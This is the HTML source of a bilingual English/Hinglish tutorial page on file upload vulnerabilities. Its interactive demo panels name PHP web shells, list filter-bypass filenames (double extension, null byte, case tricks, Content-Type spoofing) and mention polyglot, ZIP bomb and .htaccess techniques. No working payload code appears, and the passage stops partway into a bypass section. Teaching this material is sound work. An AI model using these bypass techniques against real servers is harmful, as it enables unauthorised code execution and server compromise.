<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
  <meta name="description" content="Interactive File Upload Vulnerability Masterclass with Live Hinglish Translation | Quiz | Try It Yourself | By HTB Elite Hacker">
  <title>File Upload Vulnerabilities | By Ankush Rana</title>

  <!-- Google Fonts -->
  <link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@500;600;700;900&family=Roboto:wght@300;400;500;700&family=JetBrains+Mono:wght@300;400;500&display=swap" rel="stylesheet">

  <!-- Font Awesome -->
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">

  <style>
    :root {
      --primary: #0a1121;
      --dark-navy: #0b1b30;
      --neon-green: #00ff88;
      --electric-blue: #00aaff;
      --neon-orange: #ff8800;
      --neon-pink: #ff0080;
      --glow-green: rgba(0, 255, 136, 0.3);
      --glow-blue: rgba(0, 170, 255, 0.2);
      --glow-pink: rgba(255, 0, 128, 0.3);
      --light-gray: #e0e0e0;
      --mid-gray: #aaaaaa;
      --card-bg: #111c30;
      --border: #2a4060;
      --keyword: #ffdd57;
      --keyword-bg: rgba(255, 221, 87, 0.15);
    }

    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    body {
      font-family: 'Roboto', sans-serif;
      background: var(--primary);
      color: var(--light-gray);
      line-height: 1.7;
      overflow-x: hidden;
    }

    /* Three.js Background */
    #three-canvas {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      z-index: -1;
    }

    .container {
      max-width: 1200px;
      margin: 0 auto;
      padding: 0 20px;
    }

    /* Translator Button */
    .translator-btn {
      position: fixed;
      top: 20px;
      right: 20px;
      z-index: 1000;
      background: var(--neon-green);
      color: var(--primary);
      border: none;
      border-radius: 6px;
      padding: 10px 16px;
      font-family: 'Orbitron', sans-serif;
      font-size: 0.9rem;
      cursor: pointer;
      box-shadow: 0 0 15px var(--glow-green);
      transition: all 0.3s ease;
    }

    .translator-btn:hover {
      transform: translateY(-2px);
      background: #00cc6d;
    }

    /* Header / Hero */
    header {
      height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      text-align: center;
      position: relative;
      overflow: hidden;
    }

    .hero-content {
      z-index: 2;
      max-width: 900px;
      position: relative;
    }

    .hero-content h1 {
      font-family: 'Orbitron', sans-serif;
      font-size: clamp(2.8rem, 8vw, 4rem);
      color: white;
      margin-bottom: 10px;
      text-shadow: 0 0 15px rgba(0, 255, 136, 0.6);
      animation: pulse 2s infinite;
    }

    @keyframes pulse {
      0% { text-shadow: 0 0 15px rgba(0, 255, 136, 0.6); }
      50% { text-shadow: 0 0 25px rgba(0, 255, 136, 0.9), 0 0 35px rgba(0, 255, 136, 0.5); }
      100% { text-shadow: 0 0 15px rgba(0, 255, 136, 0.6); }
    }

    .hero-content h1 span {
      color: var(--neon-green);
    }

    .subtitle {
      font-family: 'JetBrains Mono', monospace;
      font-size: clamp(1.2rem, 3.5vw, 1.5rem);
      color: var(--electric-blue);
      margin: 15px 0;
    }

    /* Section Styling */
    section {
      padding: 100px 0;
      position: relative;
    }

    .section-title {
      font-family: 'Orbitron', sans-serif;
      font-size: clamp(2rem, 5vw, 2.5rem);
      color: var(--neon-green);
      margin-bottom: 50px;
      position: relative;
      display: inline-block;
    }

    .section-title::after {
      content: '';
      position: absolute;
      left: 0;
      bottom: -8px;
      width: 70px;
      height: 4px;
      background: var(--electric-blue);
      animation: expand 2s infinite;
    }

    @keyframes expand {
      0% { width: 70px; }
      50% { width: 100px; }
      100% { width: 70px; }
    }

    /* Lecture Card */
    .lecture-card {
      background: var(--card-bg);
      border: 1px solid var(--border);
      border-radius: 16px;
      padding: 30px;
      margin: 30px 0;
      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
      transition: all 0.4s ease;
      position: relative;
      overflow: hidden;
      cursor: pointer;
    }

    .lecture-card::before {
      content: '';
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: linear-gradient(45deg, transparent, rgba(0, 255, 136, 0.05), transparent);
      z-index: 0;
    }

    .lecture-card.pop-out {
      transform: translateY(-20px) scale(1.05);
      box-shadow: 
        0 30px 60px rgba(0, 0, 0, 0.5),
        0 0 50px var(--glow-green);
      border-color: var(--neon-green);
      z-index: 5;
    }

    .lecture-card.focused {
      transform: translateY(-20px) scale(1.06);
      box-shadow: 
        0 40px 80px rgba(0, 0, 0, 0.6),
        0 0 70px var(--glow-green);
      filter: brightness(1.1);
    }

    .lecture-card h3 {
      color: var(--neon-green);
      font-family: 'Orbitron', sans-serif;
      margin-bottom: 18px;
      font-size: 1.8rem;
      position: relative;
      z-index: 2;
    }

    /* Keyword Style */
    .keyword {
      background: var(--keyword-bg);
      color: var(--keyword);
      padding: 3px 8px;
      border-radius: 4px;
      font-weight: 500;
      cursor: pointer;
      border-bottom: 1px dashed var(--keyword);
      position: relative;
      transition: all 0.3s ease;
      z-index: 2;
    }

    .keyword:hover {
      background: rgba(255, 221, 87, 0.3);
      box-shadow: 0 0 12px rgba(255, 221, 87, 0.4);
    }

    /* Tooltip (Modal) */
    .keyword-modal {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: rgba(10, 17, 33, 0.95);
      display: flex;
      align-items: center;
      justify-content: center;
      z-index: 10000;
      opacity: 0;
      visibility: hidden;
      transition: all 0.3s ease;
    }

    .keyword-modal.active {
      opacity: 1;
      visibility: visible;
    }

    .modal-content {
      background: var(--card-bg);
      border: 2px solid var(--neon-green);
      border-radius: 14px;
      padding: 30px;
      max-width: 500px;
      width: 90%;
      box-shadow: 0 0 50px var(--glow-green);
      position: relative;
      transform: scale(0.9);
      transition: transform 0.3s ease;
    }

    .keyword-modal.active .modal-content {
      transform: scale(1);
    }

    .modal-close {
      position: absolute;
      top: 15px;
      right: 15px;
      background: none;
      border: none;
      color: var(--neon-green);
      font-size: 1.5rem;
      cursor: pointer;
    }

    .modal-title {
      color: var(--neon-green);
      font-family: 'Orbitron', sans-serif;
      margin-bottom: 15px;
      font-size: 1.5rem;
    }

    .modal-body {
      color: var(--light-gray);
      line-height: 1.6;
    }

    /* Interactive Demo */
    .interactive-demo {
      background: rgba(0, 20, 40, 0.6);
      border-radius: 10px;
      padding: 25px;
      margin: 30px 0;
      border: 1px solid var(--electric-blue);
    }

    .demo-container {
      display: flex;
      flex-direction: column;
      gap: 15px;
    }

    .input-group {
      display: flex;
      align-items: center;
      gap: 10px;
    }

    .input-group label {
      min-width: 120px;
      font-family: 'JetBrains Mono', monospace;
      color: var(--neon-green);
    }

    .input-group input, .input-group select {
      flex: 1;
      padding: 10px;
      background: rgba(0, 0, 0, 0.3);
      border: 1px solid var(--border);
      border-radius: 4px;
      color: white;
      font-family: 'JetBrains Mono', monospace;
    }

    .input-group input:focus, .input-group select:focus {
      outline: none;
      border-color: var(--neon-green);
      box-shadow: 0 0 10px var(--glow-green);
    }

    .button {
      padding: 12px 24px;
      background: var(--neon-green);
      color: var(--primary);
      border: none;
      border-radius: 4px;
      font-family: 'Orbitron', sans-serif;
      font-weight: bold;
      cursor: pointer;
      transition: all 0.3s ease;
      width: fit-content;
    }

    .button:hover {
      background: #00cc6d;
      box-shadow: 0 0 15px var(--glow-green);
      transform: translateY(-2px);
    }

    .result-box {
      background: rgba(0, 0, 0, 0.5);
      border-radius: 6px;
      padding: 15px;
      margin-top: 15px;
      border-left: 3px solid var(--neon-green);
      font-family: 'JetBrains Mono', monospace;
      min-height: 100px;
      overflow-x: auto;
      white-space: pre-wrap;
    }

    /* Diagram */
    .diagram {
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 20px;
      margin: 25px 0;
      flex-wrap: wrap;
    }

    .box {
      min-width: 140px;
      padding: 18px;
      border-radius: 12px;
      text-align: center;
      font-weight: bold;
      font-size: 0.95rem;
      position: relative;
      overflow: hidden;
    }

    .box::before {
      content: '';
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: linear-gradient(45deg, transparent, rgba(255, 255, 255, 0.1), transparent);
      transform: translateX(-100%);
    }

    .box:hover::before {
      animation: shimmer 1.5s infinite;
    }

    @keyframes shimmer {
      100% { transform: translateX(100%); }
    }

    .user-input { background: #8b0000; color: white; }
    .app { background: #003366; color: white; }
    .db { background: #004d00; color: #00ff88; }

    .arrow {
      font-size: 1.8rem;
      color: var(--neon-green);
      position: relative;
    }

    .arrow::before {
      content: '→';
      animation: arrow-pulse 1.5s infinite;
    }

    @keyframes arrow-pulse {
      0% { text-shadow: 0 0 5px var(--neon-green); }
      50% { text-shadow: 0 0 15px var(--neon-green); }
      100% { text-shadow: 0 0 5px var(--neon-green); }
    }

    /* Code Block */
    .code-block {
      background: #001a1a;
      color: #00ff88;
      font-family: 'JetBrains Mono', monospace;
      padding: 15px;
      border-radius: 10px;
      overflow-x: auto;
      margin: 15px 0;
      border-left: 4px solid var(--neon-green);
      position: relative;
    }

    .code-block::before {
      content: 'CODE';
      position: absolute;
      top: 0;
      right: 0;
      background: var(--neon-green);
      color: var(--primary);
      font-size: 0.7rem;
      padding: 2px 8px;
      border-bottom-left-radius: 4px;
      font-weight: bold;
    }

    /* Statistics Section */
    .stats-container {
      display: flex;
      flex-wrap: wrap;
      gap: 20px;
      justify-content: center;
      margin: 30px 0;
    }

    .stat-box {
      background: var(--card-bg);
      border: 1px solid var(--border);
      border-radius: 10px;
      padding: 20px;
      min-width: 200px;
      text-align: center;
      transition: all 0.3s ease;
    }

    .stat-box:hover {
      transform: translateY(-5px);
      box-shadow: 0 10px 20px rgba(0, 0, 0, 0.3);
      border-color: var(--neon-green);
    }

    .stat-number {
      font-size: 2.5rem;
      font-weight: bold;
      color: var(--neon-green);
      margin-bottom: 10px;
    }

    .stat-label {
      color: var(--mid-gray);
      font-size: 0.9rem;
    }

    /* Quiz Section */
    .quiz-container {
      background: var(--card-bg);
      border: 1px solid var(--border);
      border-radius: 12px;
      padding: 25px;
      margin: 30px 0;
      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
    }

    .quiz-question {
      margin-bottom: 20px;
    }

    .quiz-question h4 {
      color: var(--neon-green);
      margin-bottom: 10px;
    }

    .options {
      display: flex;
      flex-direction: column;
      gap: 8px;
    }

    .option {
      background: rgba(0, 0, 0, 0.3);
      padding: 10px;
      border-radius: 6px;
      cursor: pointer;
      transition: all 0.3s ease;
    }

    .option:hover {
      background: rgba(0, 255, 136, 0.1);
      box-shadow: 0 0 10px rgba(0, 255, 136, 0.2);
    }

    .option.selected {
      background: var(--neon-green);
      color: var(--primary);
      font-weight: bold;
    }

    .score-display {
      text-align: center;
      font-size: 1.5rem;
      margin: 20px 0;
      color: var(--neon-green);
      font-family: 'Orbitron', sans-serif;
    }

    .button.quiz-submit {
      background: var(--neon-orange);
      color: white;
    }

    .button.quiz-submit:hover {
      background: #cc7000;
    }

    /* Progress Bar */
    .progress-container {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 4px;
      background: transparent;
      z-index: 1000;
    }

    .progress-bar {
      height: 100%;
      background: var(--neon-green);
      width: 0%;
      transition: width 0.3s ease;
    }

    /* Notification */
    .notification {
      position: fixed;
      bottom: 20px;
      right: 20px;
      background: var(--card-bg);
      border: 1px solid var(--neon-green);
      border-radius: 8px;
      padding: 15px;
      color: var(--light-gray);
      box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
      transform: translateY(100px);
      opacity: 0;
      transition: all 0.3s ease;
      z-index: 1000;
    }

    .notification.show {
      transform: translateY(0);
      opacity: 1;
    }

    /* Footer */
    footer {
      text-align: center;
      padding: 60px 0;
      background: var(--dark-navy);
      color: var(--mid-gray);
      position: relative;
      overflow: hidden;
    }

    footer::before {
      content: '';
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 3px;
      background: linear-gradient(90deg, var(--neon-green), var(--electric-blue), var(--neon-pink));
    }

    .social-links {
      display: flex;
      justify-content: center;
      gap: 20px;
      margin-top: 20px;
    }

    .social-link {
      width: 50px;
      height: 50px;
      border-radius: 50%;
      background: var(--card-bg);
      display: flex;
      align-items: center;
      justify-content: center;
      color: white;
      font-size: 1.2rem;
      transition: all 0.3s ease;
    }

    .social-link:hover {
      transform: translateY(-5px);
      box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
    }

    .social-link.github:hover { background: var(--neon-green); color: var(--primary); }
    .social-link.email:hover { background: var(--electric-blue); }
    .social-link.htb:hover { background: var(--neon-orange); }

    /* Responsive */
    @media (max-width: 768px) {
      .hero-content h1 { font-size: 2.8rem; }
      .section-title { font-size: 1.8rem; }
      .diagram { flex-direction: column; }
      .arrow::before { content: '↓'; }
      .input-group { flex-direction: column; }
      .input-group label { min-width: auto; }
    }

    /* File Upload Specific Styles */
    .file-upload-demo {
      display: flex;
      flex-direction: column;
      gap: 15px;
      margin: 20px 0;
    }

    .upload-area {
      border: 2px dashed var(--border);
      border-radius: 8px;
      padding: 30px;
      text-align: center;
      cursor: pointer;
      transition: all 0.3s ease;
    }

    .upload-area:hover {
      border-color: var(--neon-green);
      background: rgba(0, 255, 136, 0.05);
    }

    .upload-area i {
      font-size: 3rem;
      color: var(--electric-blue);
      margin-bottom: 15px;
    }

    .file-preview {
      margin-top: 15px;
      padding: 10px;
      background: rgba(0, 0, 0, 0.3);
      border-radius: 6px;
      text-align: left;
    }
  </style>
</head>
<body>

  <!-- Progress Bar -->
  <div class="progress-container">
    <div class="progress-bar" id="progress-bar"></div>
  </div>

  <!-- Translator Button -->
  <button class="translator-btn" id="translator-btn" onclick="toggleLanguage()" style="right: auto; left: 20px;">
    🌐 Hinglish On
  </button>

  <!-- Keyword Modal -->
  <div class="keyword-modal" id="keyword-modal">
    <div class="modal-content">
      <button class="modal-close" id="modal-close">&times;</button>
      <h3 class="modal-title" id="modal-title">Keyword</h3>
      <div class="modal-body" id="modal-body">Definition will appear here.</div>
    </div>
  </div>

  <!-- Notification -->
  <div class="notification" id="notification">
    <i class="fas fa-info-circle"></i> <span id="notification-text">Welcome to the File Upload Vulnerability Masterclass!</span>
  </div>

  <!-- Three.js Background Canvas -->
  <canvas id="three-canvas"></canvas>

  <!-- Header / Hero -->
  <header id="home">
    <div class="container">
      <div class="hero-content">
        <!-- English Version -->
        <div class="en">
          <h1>File Upload <span>Vulnerabilities</span></h1>
          <div class="subtitle">By Ankush Rana | HTB Elite Hacker | Senior Security Engineer</div>
          <p>A deep dive into file upload vulnerabilities, exploitation techniques, and real-world attacks — with interactive demos and elite-level insights.</p>
        </div>

        <!-- Hinglish Version -->
        <div class="hi" style="display:none;">
          <h1>File Upload <span>Vulnerabilities</span></h1>
          <div class="subtitle">Ankush Rana द्वारा | HTB Elite Hacker | Senior Security Engineer</div>
          <p>File upload vulnerabilities, exploitation techniques, aur real-world attacks mein gahrai se jaane — interactive demos aur elite-level samajh ke saath.</p>
        </div>

        <!-- HTB & Bug Bounty Credibility -->
        <div style="margin-top: 40px; display: flex; align-items: center; gap: 25px; flex-wrap: wrap; justify-content: center; font-family: 'JetBrains Mono', monospace;">
          <img src="https://www.hackthebox.com/storage/achievements/elite_2024_badge.svg" alt="HTB Elite" style="width: 90px; filter: drop-shadow(0 0 10px rgba(0, 255, 136, 0.5));">
          <div style="text-align: center;">
            <img src="https://via.placeholder.com/100/0a1121/00ff88?text=AR" alt="Ankush Rana" style="width: 80px; height: 80px; border-radius: 50%; border: 2px solid var(--neon-green); filter: drop-shadow(0 0 10px rgba(0, 255, 136, 0.5));">
            <p style="margin: 5px 0 0; color: var(--neon-green);">52+ User Flags</p>
            <p style="margin: 0; color: var(--electric-blue);">47+ Root Owned</p>
          </div>
          <div style="text-align: center;">
            <p style="color: var(--neon-orange);">🏆 Top 10 India</p>
            <p style="color: var(--neon-pink);">💼 Sattrix | GPSSI</p>
          </div>
        </div>

        <!-- Call to Action -->
        <div style="margin-top: 30px; font-family: 'Orbitron', sans-serif; color: var(--electric-blue);">
          <i class="fas fa-mouse-pointer"></i> Toggle Hinglish Mode → <strong>Top Left Corner</strong>
        </div>
      </div>
    </div>
  </header>

  <!-- Section: What is File Upload Vulnerability? -->
  <section id="basics">
    <div class="container">
      <h2 class="section-title en">What are File Upload Vulnerabilities?</h2>
      <h2 class="section-title hi" style="display:none;">File Upload Vulnerabilities Kya Hain?</h2>
      
      <!-- Progress Tracker -->
      <div class="progress-tracker" style="display: flex; justify-content: space-between; margin: 20px 0; font-family: 'Orbitron', sans-serif;">
        <div class="progress-step active" style="text-align: center; flex: 1; padding: 10px; background: rgba(0, 255, 136, 0.1); border: 1px solid var(--neon-green); border-radius: 8px; margin: 0 5px;">
          <div class="step-number" style="font-size: 1.5rem; color: var(--neon-green);">1</div>
          <div class="step-title en">Basic Concepts</div>
          <div class="step-title hi" style="display:none;">Mool Baat</div>
        </div>
        <div class="progress-step" style="text-align: center; flex: 1; padding: 10px; background: rgba(0, 170, 255, 0.1); border: 1px solid var(--electric-blue); border-radius: 8px; margin: 0 5px;">
          <div class="step-number" style="font-size: 1.5rem; color: var(--electric-blue);">2</div>
          <div class="step-title en">Attack Vectors</div>
          <div class="step-title hi" style="display:none;">Hamlawar Ke Tarika</div>
        </div>
        <div class="progress-step" style="text-align: center; flex: 1; padding: 10px; background: rgba(255, 136, 0, 0.1); border: 1px solid var(--neon-orange); border-radius: 8px; margin: 0 5px;">
          <div class="step-number" style="font-size: 1.5rem; color: var(--neon-orange);">3</div>
          <div class="step-title en">Advanced Techniques</div>
          <div class="step-title hi" style="display:none;">Uchatam Tarika</div>
        </div>
        <div class="progress-step" style="text-align: center; flex: 1; padding: 10px; background: rgba(255, 0, 128, 0.1); border: 1px solid var(--neon-pink); border-radius: 8px; margin: 0 5px;">
          <div class="step-number" style="font-size: 1.5rem; color: var(--neon-pink);">4</div>
          <div class="step-title en">Prevention</div>
          <div class="step-title hi" style="display:none;">Bachav</div>
        </div>
      </div>

      <div class="lecture-card animate-on-scroll" onmouseenter="highlightCard(this)" onmouseleave="unhighlightCard(this)" onclick="focusCard(this)">
        <h3 class="en">Understanding File Upload Vulnerabilities</h3>
        <h3 class="hi" style="display:none;">File Upload Vulnerabilities Ki Samajh</h3>
        <p class="en">File upload vulnerabilities occur when web applications allow users to upload files without proper validation, filtration, or security measures. Attackers can exploit these vulnerabilities to upload malicious files that can lead to complete system compromise.</p>
        <p class="hi" style="display:none;">File upload vulnerabilities tab hoti hain jab web applications upyogkartriyon ko bina uchit jaanch, filtration, ya suraksha upayon ke files upload karne ki anumati deti hain. Hamlawar in kamjoriyon ka faida uthakar dushit files upload kar sakte hain jo poori system compromise ka karan ban sakti hain.</p>
        <p class="en"><strong>Real Analogy:</strong> Like a building security guard who allows anyone to bring in any package without checking its contents - an attacker could bring in a dangerous item disguised as a harmless package.</p>
        <p class="hi" style="display:none;"><strong>Asli Example:</strong> Jaise ek building security guard jo kisi ko bina contents check kiye koi bhi package lane ki anumati de deta hai - ek hamlawar ek khatarnaak cheez ko nirdayi package ke bhesh mein le aa sakta hai.</p>
        <p class="en">File upload vulnerabilities are critical because they can lead to remote code execution, data breaches, and complete server takeover.</p>
        <p class="hi" style="display:none;">File upload vulnerabilities kritik hain kyunki yeh remote code execution, data breaches, aur poori server takeover ka karan ban sakti hain.</p>
        <p class="en"><span class="keyword" data-title="File Upload Vulnerability" data-content="A security flaw that allows attackers to upload malicious files to a web server.">File Upload Vulnerability</span> is dangerous because it bypasses security controls and can provide attackers with a foothold on the server.</p>
        <p class="hi" style="display:none;"><span class="keyword" data-title="File Upload Vulnerability" data-content="Ek suraksha kami jo hamlawaron ko web server par dushit files upload karne ki anumati deti hai.">File Upload Vulnerability</span> khatarnaak hai kyunki yeh suraksha niyantrano ko bypass karti hai aur hamlawaron ko server par foothold pradan kar sakti hai.</p>
      </div>

      <!-- File Upload Visualization -->
      <div class="lecture-card animate-on-scroll">
        <h3 class="en">How File Upload Attacks Work - Visualization</h3>
        <h3 class="hi" style="display:none;">File Upload Attacks Kaise Kaam Karte Hain - Chitra</h3>
        <div class="diagram" style="margin: 30px 0;">
          <div class="box user-input" style="min-width: 180px;">
            <div class="en">Malicious File</div>
            <div class="hi" style="display:none;">Dushit File</div>
            <div style="font-size: 0.8rem; margin-top: 10px;">shell.php</div>
          </div>
          <div class="arrow"></div>
          <div class="box app" style="min-width: 180px;">
            <div class="en">Server Processing</div>
            <div class="hi" style="display:none;">Server Processing</div>
            <div style="font-size: 0.8rem; margin-top: 10px;">No File Validation</div>
          </div>
          <div class="arrow"></div>
          <div class="box db" style="min-width: 180px;">
            <div class="en">Server Compromise</div>
            <div class="hi" style="display:none;">Server Compromise</div>
            <div style="font-size: 0.8rem; margin-top: 10px;">Remote Code Execution</div>
          </div>
        </div>
        <p class="en">The application accepts and processes uploaded files without proper validation, allowing malicious files to be stored and executed on the server.</p>
        <p class="hi" style="display:none;">Application bina uchit jaanch ke uploaded files ko svikar aur process karti hai, jo dushit files ko server par store aur execute hone ki anumati deti hai.</p>
      </div>

      <!-- Types of File Upload Attacks -->
      <div class="lecture-card animate-on-scroll">
        <h3 class="en">Types of File Upload Attacks</h3>
        <h3 class="hi" style="display:none;">File Upload Attacks Ke Prakar</h3>
        <ul style="margin: 15px 0 15px 30px;">
          <li class="en"><span class="keyword" data-title="Malicious File Execution" data-content="Uploading and executing malicious scripts like PHP, ASP, or JSP files.">Malicious File Execution</span>: Uploading and executing malicious scripts (PHP, ASP, JSP)</li>
          <li class="hi" style="display:none;"><span class="keyword" data-title="Malicious File Execution" data-content="PHP, ASP, ya JSP files jaise dushit scripts upload aur execute karna.">Malicious File Execution</span>: Dushit scripts upload aur execute karna (PHP, ASP, JSP)</li>
          <li class="en"><span class="keyword" data-title="Client-Side Attacks" data-content="Uploading malicious HTML, JS, or SVG files that execute in user browsers.">Client-Side Attacks</span>: Uploading malicious files that execute in user browsers (HTML, JS, SVG)</li>
          <li class="hi" style="display:none;"><span class="keyword" data-title="Client-Side Attacks" data-content="Dushit HTML, JS, ya SVG files upload karna jo upyogkartri browsers mein execute hoti hain.">Client-Side Attacks</span>: Dushit files upload karna jo upyogkartri browsers mein execute hoti hain (HTML, JS, SVG)</li>
          <li class="en"><span class="keyword" data-title="DoS Attacks" data-content="Uploading extremely large files to consume server resources and cause denial of service.">DoS Attacks</span>: Uploading extremely large files to cause denial of service</li>
          <li class="hi" style="display:none;"><span class="keyword" data-title="DoS Attacks" data-content="Server resources ko khatam karne aur service denial karne ke liye bahut badi files upload karna.">DoS Attacks</span>: Service denial karne ke liye bahut badi files upload karna</li>
          <li class="en"><span class="keyword" data-title="Zip Slip" data-content="Exploiting archive extraction to write files to arbitrary locations on the server.">Zip Slip</span>: Exploiting archive extraction to write files to arbitrary locations</li>
          <li class="hi" style="display:none;"><span class="keyword" data-title="Zip Slip" data-content="Archive extraction ka faida uthakar server par manmani locations mein files likhna.">Zip Slip</span>: Archive extraction ka faida uthakar manmani locations mein files likhna</li>
        </ul>
      </div>

      <!-- Statistics -->
      <div class="stats-container animate-on-scroll">
        <div class="stat-box">
          <div class="stat-number en">Critical</div>
          <div class="stat-number hi" style="display:none;">Kritik</div>
          <div class="stat-label en">severity rating</div>
          <div class="stat-label hi" style="display:none;">khatre ka level</div>
        </div>
        <div class="stat-box">
          <div class="stat-number">40%</div>
          <div class="stat-label en">of web apps vulnerable</div>
          <div class="stat-label hi" style="display:none;">web apps kamjor hain</div>
        </div>
        <div class="stat-box">
          <div class="stat-number">$12K+</div>
          <div class="stat-label en">in bug bounty rewards</div>
          <div class="stat-label hi" style="display:none;">bug bounty mein kamai</div>
        </div>
      </div>
    </div>
  </section>

  <!-- Section: Try It Yourself – File Upload -->
  <section id="try-upload">
    <div class="container">
      <h2 class="section-title en">Try It Yourself: File Upload Exploitation</h2>
      <h2 class="section-title hi" style="display:none;">Khud Try Karein: File Upload Doharpan</h2>
      
      <!-- Learning Path Progress -->
      <div class="lecture-card animate-on-scroll">
        <h3 class="en">Learning Path: Basic to Advanced</h3>
        <h3 class="hi" style="display:none;">Sikshna Marg: Mool Se Uchatam</h3>
        <div class="progress-tracker" style="display: flex; justify-content: space-between; margin: 20px 0; font-family: 'Orbitron', sans-serif;">
          <div class="progress-step active" style="text-align: center; flex: 1; padding: 10px; background: rgba(0, 255, 136, 0.1); border: 1px solid var(--neon-green); border-radius: 8px; margin: 0 5px;">
            <div class="step-number" style="font-size: 1.2rem; color: var(--neon-green);">1</div>
            <div class="step-title en">Basic Upload</div>
            <div class="step-title hi" style="display:none;">Mool Upload</div>
          </div>
          <div class="progress-step" style="text-align: center; flex: 1; padding: 10px; background: rgba(0, 170, 255, 0.1); border: 1px solid var(--electric-blue); border-radius: 8px; margin: 0 5px;">
            <div class="step-number" style="font-size: 1.2rem; color: var(--electric-blue);">2</div>
            <div class="step-title en">Bypass Filters</div>
            <div class="step-title hi" style="display:none;">Filters Bypass</div>
          </div>
          <div class="progress-step" style="text-align: center; flex: 1; padding: 10px; background: rgba(255, 136, 0, 0.1); border: 1px solid var(--neon-orange); border-radius: 8px; margin: 0 5px;">
            <div class="step-number" style="font-size: 1.2rem; color: var(--neon-orange);">3</div>
            <div class="step-title en">Advanced Techniques</div>
            <div class="step-title hi" style="display:none;">Uchatam Tarika</div>
          </div>
        </div>
      </div>

      <!-- Basic Upload Demo -->
      <div class="interactive-demo animate-on-scroll">
        <h3 style="color: var(--neon-green); margin-bottom: 15px;" class="en">Level 1: Basic Malicious File Upload</h3>
        <h3 style="color: var(--neon-green); margin-bottom: 15px; display:none;" class="hi">Level 1: Mool Dushit File Upload</h3>
        <p class="en">Upload a simple PHP web shell to gain remote code execution on the server.</p>
        <p class="hi" style="display:none;">Server par remote code execution prapt karne ke liye ek simple PHP web shell upload karein.</p>
        
        <div class="file-upload-demo">
          <div class="upload-area" id="upload-area">
            <i class="fas fa-cloud-upload-alt"></i>
            <p class="en">Drag & Drop your file here or click to browse</p>
            <p class="hi" style="display:none;">Apni file yahan drag & drop karein ya browse karne ke liye click karein</p>
          </div>
          
          <div class="input-group">
            <label for="file-type" class="en">File Type:</label>
            <label for="file-type" class="hi" style="display:none;">File Type:</label>
            <select id="file-type">
              <option value="php">PHP Shell</option>
              <option value="js">Malicious JavaScript</option>
              <option value="svg">Malicious SVG</option>
            </select>
          </div>
          
          <button class="button" onclick="runFileUpload()">Upload File</button>
          
          <div class="result-box" id="upload-result">
// File upload results will appear here
          </div>
        </div>
      </div>

      <!-- Filter Bypass Demo -->
      <div class="interactive-demo animate-on-scroll">
        <h3 style="color: var(--electric-blue); margin-bottom: 15px;" class="en">Level 2: Bypassing Upload Filters</h3>
        <h3 style="color: var(--electric-blue); margin-bottom: 15px; display:none;" class="hi">Level 2: Upload Filters Ko Bypass Karna</h3>
        <p class="en">Use various techniques to bypass file type restrictions and upload filters.</p>
        <p class="hi" style="display:none;">File type restrictions aur upload filters ko bypass karne ke liye vibhinn tarikon ka upyog karein.</p>
        
        <div class="demo-container">
          <div class="input-group">
            <label for="bypass-technique" class="en">Bypass Technique:</label>
            <label for="bypass-technique" class="hi" style="display:none;">Bypass Technique:</label>
            <select id="bypass-technique">
              <option value="double-ext">Double Extension (shell.php.jpg)</option>
              <option value="null-byte">Null Byte Injection (shell.php%00.jpg)</option>
              <option value="case">Case Manipulation (sHeLl.PhP)</option>
              <option value="content-type">Content-Type Manipulation</option>
            </select>
          </div>
          
          <div class="code-block">
// Example bypass techniques:
// Double extension: shell.php.jpg
// Null byte: shell.php%00.jpg
// Case manipulation: sHeLl.PhP
// Content-Type: image/jpeg for PHP file
          </div>
          
          <button class="button" onclick="testBypassTechnique()">Test Bypass</button>
          
          <div class="result-box" id="bypass-result">
// Bypass results will appear here
          </div>
        </div>
      </div>

      <!-- Advanced Techniques Demo -->
      <div class="interactive-demo animate-on-scroll">
        <h3 style="color: var(--neon-orange); margin-bottom: 15px;" class="en">Level 3: Advanced Upload Techniques</h3>
        <h3 style="color: var(--neon-orange); margin-bottom: 15px; display:none;" class="hi">Level 3: Uchatam Upload Tarika</h3>
        <p class="en">Use advanced techniques like polyglot files, ZIP bombs, and exploiting parsing inconsistencies.</p>
        <p class="hi" style="display:none;">Polyglot files, ZIP bombs, aur parsing inconsistencies ka faida uthakar uchatam tarikon ka upyog karein.</p>
        
        <div class="demo-container">
          <div class="input-group">
            <label for="advanced-technique" class="en">Advanced Technique:</label>
            <label for="advanced-technique" class="hi" style="display:none;">Uchatam Technique:</label>
            <select id="advanced-technique">
              <option value="polyglot">Polyglot Files (GIF + PHP)</option>
              <option value="zip-bomb">ZIP Bomb</option>
              <option value="parser">Parser Inconsistency</option>
              <option value="htaccess">.htaccess Manipulation</option>
            </select>
          </div>
          
          <div class="code-block">
// Advanced attack examples:
// Polyglot file: A file that is both valid GIF and PHP
// ZIP bomb: A small ZIP that extracts to enormous size
// Parser inconsistency: Exploiting differences between client and server parsing
// .htaccess: Uploading a malicious .htaccess to execute files as PHP
          </div>
          
          <button class="button" onclick="testAdvancedTechnique()">Test Technique</button>
          
          <div class="result-box" id="advanced-result">
// Advanced technique results will appear here
          </div>
        </div>
      </div>
    </div>
  </section>

  <!-- Section: Bypass Techniques -->
  <section id="bypass">
    <div class="container">
      <h2 class="section-title en">Bypassing File Upload Restrictions</h2>
      <h2 class="section-title hi" style="display:none;">File Upload Restrictions Ko Kaise Bypass Karein</h2>
      
      <!-- Attack Vector Visualization -->
      <div class="lecture-card animate-on-scroll">
        <h3 class="en">File Upload Bypass - Visualization</h3>
